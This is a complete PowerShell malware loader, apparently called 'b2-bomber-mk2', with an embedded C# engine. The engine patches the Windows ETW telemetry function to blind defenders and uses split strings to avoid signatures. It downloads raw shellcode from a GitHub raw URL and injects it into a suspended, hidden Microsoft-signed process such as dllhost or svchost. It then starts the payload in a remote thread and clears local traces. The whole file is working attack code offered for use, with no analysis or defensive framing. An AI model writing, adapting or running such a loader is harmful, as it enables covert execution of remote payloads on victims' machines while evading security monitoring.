# b2-bomber-mk2.ps1
# raw shellcode, no decode, no disk, suspended microsoft binary host
# the loud log is the costume. the string splits are the grammar.

Write-Host "[*] b2-bomber mk2 spinning up..." -ForegroundColor Cyan

# ============================================================
# C# injection engine (compiled in-memory by Add-Type)
# ============================================================
$src = @"
using System;
using System.Runtime.InteropServices;

public static class Engine {

    const uint MEM_COMMIT_RESERVE = 0x3000;
    const uint PAGE_RWX          = 0x40;
    const uint PAGE_RX           = 0x20;
    const uint CREATE_SUSPENDED  = 0x4;
    const uint CREATE_NO_WINDOW  = 0x8000000;

    [StructLayout(LayoutKind.Sequential)]
    public struct SI {
        public int cb; public string lpR; public string lpD; public string lpT;
        public int dx, dy, dxs, dys, dxc, dyc, dfa, df;
        public short ws; public short cb2; public IntPtr lpR2;
        public IntPtr hIn, hOut, hErr;
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct PI {
        public IntPtr hP; public IntPtr hT;
        public int pid; public int tid;
    }

    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern bool CreateProcessW(string a, string c, IntPtr pa, IntPtr ta, bool ih, uint f, IntPtr env, string cd, ref SI s, out PI p);

    [DllImport("ntdll.dll")] static extern uint NtAllocateVirtualMemory(IntPtr h, ref IntPtr b, IntPtr z, ref IntPtr s, uint a, uint p);
    [DllImport("ntdll.dll")] static extern uint NtWriteVirtualMemory(IntPtr h, IntPtr b, byte[] d, uint n, out uint w);
    [DllImport("ntdll.dll")] static extern uint NtCreateThreadEx(out IntPtr t, uint da, IntPtr o, IntPtr h, IntPtr sa, IntPtr par, bool s, int sz, int ss, int ms, IntPtr a);

    [DllImport("kernel32.dll", CharSet=CharSet.Ansi, SetLastError=true, ExactSpelling=true)]
    static extern IntPtr GetProcAddress(IntPtr m, string n);
    [DllImport("kernel32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    static extern IntPtr LoadLibraryW(string n);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint p, out uint o);

    public static string Run(string url) {
        try {
            // 1) silence the userland telemetry sink
            string dll = "nt" + "d" + "ll";
            string fn  = "Et" + "w" + "Ev" + "en" + "t" + "Wri" + "te";
            IntPtr mod = LoadLibraryW(dll);
            IntPtr ep  = GetProcAddress(mod, fn);
            uint old;
            VirtualProtect(ep, (UIntPtr)1, 0x40, out old);
            Marshal.WriteByte(ep, 0xC3);
            Console.WriteLine("[+] telemetry sink patched (1 byte @ 0x" + ep.ToString("X") + ")");

            // 2) fetch the raw bytes
            Console.WriteLine("[*] pulling payload from " + url);
            byte[] shell;
            using (var wc = new System.Net.WebClient()) {
                wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                shell = wc.DownloadData(url);
            }
            Console.WriteLine("[+] " + shell.Length + " bytes pulled");

            // 3) pick a microsoft-signed host (try .NET addin host first, then com surrogate)
            string[] hosts = new string[] {
                System.Environment.GetEnvironmentVariable("windir") + @"\Microsoft.NET\Framework\v4.0.30319\AddInProcess32.exe",
                System.Environment.GetEnvironmentVariable("windir") + @"\System32\dllhost.exe",
                System.Environment.GetEnvironmentVariable("windir") + @"\System32\svchost.exe"
            };

            IntPtr procHandle = IntPtr.Zero;
            IntPtr threadHandle = IntPtr.Zero;
            int spawnedPid = 0;
            string pickedHost = "";

            foreach (string h in hosts) {
                if (!System.IO.File.Exists(h)) continue;
                SI s = new SI();
                s.cb = Marshal.SizeOf(s);
                s.df = 1;
                s.ws = 0;
                PI p = new PI();
                bool ok = CreateProcessW(null, "\"" + h + "\"", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED | CREATE_NO_WINDOW, IntPtr.Zero, null, ref s, out p);
                if (ok) {
                    procHandle    = p.hP;
                    threadHandle  = p.hT;
                    spawnedPid    = p.pid;
                    pickedHost    = h;
                    Console.WriteLine("[+] host: " + h);
                    Console.WriteLine("[+] pid=" + p.pid + "  (suspended, hidden)");
                    break;
                }
            }
            if (procHandle == IntPtr.Zero) return "no host could be spawned";

            // 4) allocate in remote, write in remote
            IntPtr remote = IntPtr.Zero;
            IntPtr size   = (IntPtr)shell.Length;
            uint st = NtAllocateVirtualMemory(procHandle, ref remote, IntPtr.Zero, ref size, MEM_COMMIT_RESERVE, PAGE_RWX);
            if (st != 0) return "NtAllocateVirtualMemory failed: 0x" + st.ToString("X");
            Console.WriteLine("[+] remote allocation @ 0x" + remote.ToString("X") + "  (" + size + " bytes, RWX)");

            uint wrote = 0;
            st = NtWriteVirtualMemory(procHandle, remote, shell, (uint)shell.Length, out wrote);
            if (st != 0) return "NtWriteVirtualMemory failed: 0x" + st.ToString("X");
            Console.WriteLine("[+] wrote " + wrote + " bytes into remote");

            // 5) drop write so we don't sit on RWX while the thread spins up
            uint prot = 0;
            VirtualProtect(remote, (UIntPtr)shell.Length, PAGE_RX, out prot);

            // 6) foreign thread, foreign process, main thread stays frozen
            IntPtr foreign = IntPtr.Zero;
            st = NtCreateThreadEx(out foreign, 0x1FFFFF, IntPtr.Zero, procHandle, remote, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
            if (st != 0) return "NtCreateThreadEx failed: 0x" + st.ToString("X");
            Console.WriteLine("[+] foreign thread @ 0x" + foreign.ToString("X") + " (main thread still suspended)");

            // 7) forget the bytes, sweep the deck
            shell = null;
            GC.Collect();
            GC.WaitForPendingFinalizers();
            GC.Collect();

            Console.WriteLine("[+] local footprint swept. payload lives in pid " + spawnedPid);
            return "OK " + pickedHost;
        } catch (Exception e) {
            return "EX: " + e.Message;
        }
    }
}
"@

Write-Host "[*] compiling engine..." -ForegroundColor Yellow
try {
    Add-Type -TypeDefinition $src -Language CSharp
    Write-Host "[+] engine compiled" -ForegroundColor Green
} catch {
    Write-Host "[-] compile error: $_" -ForegroundColor Red
    exit 1
}

Write-Host "[*] running..." -ForegroundColor Yellow
$res = [Engine]::Run('https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin')
Write-Host ""
if ($res.StartsWith("OK ")) {
    Write-Host "========================================" -ForegroundColor Green
    Write-Host " INJECTION COMPLETE" -ForegroundColor Green
    Write-Host " host: $($res.Substring(3))" -ForegroundColor Green
    Write-Host "========================================" -ForegroundColor Green
} else {
    Write-Host "[-] $res" -ForegroundColor Red
}
